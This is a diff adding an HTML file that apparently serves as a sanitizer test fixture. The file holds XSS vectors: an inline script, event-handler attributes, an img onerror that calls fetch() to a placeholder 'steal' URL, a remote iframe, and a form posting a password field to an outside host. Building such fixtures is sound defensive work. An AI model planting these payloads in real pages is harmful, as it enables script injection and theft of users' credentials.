@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head><title>Malicious HTML</title></head>
+<body>
+  <script>window.__pwned = true; document.title = "pwned";</script>
+  <p onclick="alert('hacked')">Click me</p>
+  <img src="https://example.invalid/leak.png" alt="Remote Leak" onerror="fetch('https://example.invalid/steal')" />
+  <iframe src="https://example.invalid"></iframe>
+  <form action="https://example.invalid"><input name="pass" /></form>
+  <p>Safe paragraph text that should survive sanitization.</p>
+</body>
+</html>
